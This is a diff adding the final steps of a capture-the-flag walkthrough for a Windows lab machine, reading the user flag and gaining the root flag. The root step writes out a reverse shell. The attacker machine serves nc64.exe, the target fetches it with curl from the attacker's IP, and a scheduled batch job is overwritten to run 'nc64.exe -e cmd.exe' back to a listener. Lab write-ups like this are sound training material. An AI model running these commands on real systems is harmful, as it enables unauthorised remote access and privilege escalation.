@@ -67,3 +67,32 @@ goto theEnd
 wevtutil.exe
 ```
 Answer: **wevtutil.exe**
+#### Task 8: Submit user flag
+```html
+type C:\Users\Daniel\Desktop\user.txt
+```
+#### TAsk 9: Submit root flag
+On attacker machine:
+```html
+# Download nc64.exe
+wget https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe
+
+# Start HTTP server in the same folder
+python3 -m http.server 8000
+
+# Start listener
+nc -lvnp 4444
+```
+On target:
+```html
+# Download nc64.exe
+curl http://<OUR IP>:8000/nc64.exe -o C:\Log-Management\nc64.exe
+
+# Update job.bat
+cmd /c "echo C:\Log-Management\nc64.exe -e cmd.exe <OUR IP> 4444 > C:\Log-Management\job.bat"
+```
+Once we got shell:
+```html
+C:\Users\Administrator\Desktop>more root.txt
+more root.txt
+```
